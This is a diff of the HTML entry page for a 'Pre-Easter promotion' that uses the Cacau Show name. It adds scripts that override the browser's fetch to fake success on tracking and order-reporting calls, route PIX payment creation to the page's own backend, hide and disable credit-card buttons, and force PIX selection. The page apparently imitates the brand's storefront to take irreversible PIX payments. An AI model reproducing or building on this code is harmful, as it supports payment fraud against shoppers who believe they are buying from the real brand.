@@ -1,7 +1,6 @@
 <!doctype html>
 <html lang="pt-BR">
-
-
+<head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Promocao Pre-Pascoa | Cacau Show</title>
@@ -12,101 +11,118 @@
     <link rel="preload" as="image" href="products/dreams-dubai-pistache.png" />
     <link rel="preload" as="image" href="products/dreams-mil-folhas.png" />
 
-    <meta property="og:type" content="website" />
-    <meta property="og:title" content="Promocao Pre-Pascoa Cacau Show">
-    <meta property="og:description" content="Aproveite os melhores precos em chocolates Cacau Show!">
-    
-<script>
-  (function () {
-    if (typeof window === "undefined" || typeof window.fetch !== "function") return;
-    var originalFetch = window.fetch.bind(window);
-    var pixCache = null;
+    <script>
+      (function () {
+        if (typeof window === "undefined" || typeof window.fetch !== "function") return;
 
-    window.fetch = function (input, init) {
-      var url = typeof input === "string" ? input : (input.url || "");
+        var originalFetch = window.fetch.bind(window);
+        var pixCache = null;
 
-      // 1. Mata chamadas de rastreio que geram erros no console
-      if (url.indexOf("ipapi.co") !== -1 || url.indexOf("send-utmify-order") !== -1 || url.indexOf("rum?") !== -1) {
-        return Promise.resolve(new Response(JSON.stringify({ status: "ok" }), { status: 200 }));
-      }
+        window.fetch = function (input, init) {
+          var url = typeof input === "string" ? input : (input.url || "");
 
-      // 2. Trava de Cache para o PIX
-      if (url.indexOf("/create-pix-transaction") !== -1) {
-        if (pixCache) return Promise.resolve(pixCache.clone());
-        return originalFetch("/api/create-pix-transaction", init).then(function(res) {
-          if (res.ok) { pixCache = res.clone(); return res; }
-          return res;
-        });
-      }
+          // 1. Bloqueia chamadas de rastreio que travam o checkout
+          if (url.indexOf("ipapi.co") !== -1 || url.indexOf("send-utmify-order") !== -1 || url.indexOf("rum?") !== -1) {
+            return Promise.resolve(new Response(JSON.stringify({ status: "skipped" }), { status: 200 }));
+          }
 
-      // 3. Status Check
-      if (url.indexOf("/check-transaction-status") !== -1) {
-        var query = url.indexOf("?") !== -1 ? url.slice(url.indexOf("?")) : "";
-        return originalFetch("/api/check-transaction-status" + query, init);
-      }
+          // 2. Intercepta e Formata a Criação do PIX
+          if (url.indexOf("/create-pix-transaction") !== -1) {
+            if (pixCache) return Promise.resolve(pixCache.clone());
 
-      return originalFetch(input, init);
-    };
-  })();
-</script>
+            return originalFetch("/api/create-pix-transaction", init).then(async function(res) {
+              if (res.ok) {
+                var data = await res.json();
+                
+                // Mapeia o seu JSON para o formato que o index-SbekvIi0.js espera
+                var mappedResponse = {
+                  success: true,
+                  data: {
+                    id: data.id,
+                    pix: {
+                      qrcode: data.qrcode || data.pix_code || data.copy_and_paste
+                    },
+                    qrCode: data.qrcode || data.pix_code
+                  }
+                };
 
-<script>
-  (function () {
-    function enforcePixOnly() {
-      var buttons = Array.prototype.slice.call(document.querySelectorAll("button"));
-      var pixToggle = null;
+                var finalRes = new Response(JSON.stringify(mappedResponse), {
+                  status: 200,
+                  headers: { 'Content-Type': 'application/json' }
+                });
 
-      buttons.forEach(function (btn) {
-        var text = btn.textContent.toLowerCase();
-        // Esconde crédito
-        if (text.indexOf("cartao") !== -1 || text.indexOf("credito") !== -1) {
-          btn.style.display = "none";
+                pixCache = finalRes.clone();
+                return finalRes;
+              }
+              return res;
+            });
+          }
+
+          // 3. Intercepta Checagem de Status
+          if (url.indexOf("/check-transaction-status") !== -1) {
+            var query = url.indexOf("?") !== -1 ? url.slice(url.indexOf("?")) : "";
+            return originalFetch("/api/check-transaction-status" + query, init);
+          }
+
+          return originalFetch(input, init);
+        };
+      })();
+    </script>
+
+    <script>
+      (function () {
+        function enforcePixOnly() {
+          var buttons = Array.prototype.slice.call(document.querySelectorAll("button"));
+          var pixToggle = null;
+
+          buttons.forEach(function (btn) {
+            var text = (btn.textContent || "").toLowerCase();
+
+            // Esconde opções de cartão
+            if (text.indexOf("cartao") !== -1 || text.indexOf("credito") !== -1) {
+              btn.style.display = "none";
+              btn.disabled = true;
+            }
+
+            // Identifica botão de PIX
+            if (text.indexOf("pix") !== -1 && text.indexOf("desconto") !== -1) {
+              pixToggle = btn;
+            }
+          });
+
+          // Clica no PIX apenas uma vez e se o QR Code não estiver visível
+          if (pixToggle && !pixToggle.dataset.forced) {
+            var hasQrCode = !!document.querySelector('img[src*="base64"], canvas, svg');
+            if (!hasQrCode) {
+              pixToggle.dataset.forced = "true";
+              pixToggle.click();
+            }
+          }
         }
-        // Identifica botão PIX
-        if (text.indexOf("pix") !== -1 && text.indexOf("desconto") !== -1) {
-          pixToggle = btn;
+
+        // Inicia o observador apenas quando o body existir
+        function initObserver() {
+          if (!document.body) {
+            setTimeout(initObserver, 50);
+            return;
+          }
+          enforcePixOnly();
+          var observer = new MutationObserver(enforcePixOnly);
+          observer.observe(document.body, { childList: true, subtree: true });
         }
-      });
 
-      // Só clica se não houver QR Code na tela e se ainda não clicamos
-      if (pixToggle && !pixToggle.dataset.done) {
-        var hasQrCode = !!document.querySelector('img[src*="base64"], canvas, svg');
-        if (!hasQrCode) {
-          pixToggle.dataset.done = "true";
-          pixToggle.click();
-          console.log("PIX Selecionado automaticamente.");
+        if (document.readyState === "loading") {
+          document.addEventListener("DOMContentLoaded", initObserver);
+        } else {
+          initObserver();
         }
-      }
-    }
+      })();
+    </script>
 
-    // Inicia o Observer com segurança
-    function startObserver() {
-      if (!document.body) {
-        setTimeout(startObserver, 100);
-        return;
-      }
-      
-      enforcePixOnly();
-      var observer = new MutationObserver(enforcePixOnly);
-      observer.observe(document.body, { childList: true, subtree: true });
-    }
-
-    // Garante que o DOM está carregado
-    if (document.readyState === "loading") {
-      document.addEventListener("DOMContentLoaded", startObserver);
-    } else {
-      startObserver();
-    }
-  })();
-</script>
     <script type="module" crossorigin src="assets/index-SbekvIi0.js"></script>
     <link rel="stylesheet" crossorigin href="assets/index-CQVhuwHR.css">
-  </head>
-  <body>
+</head>
+<body>
     <div id="root"></div>
-  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"b122873502cf4fcf9ab57531cc4f28c6","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
-
-
-
-
+</html>
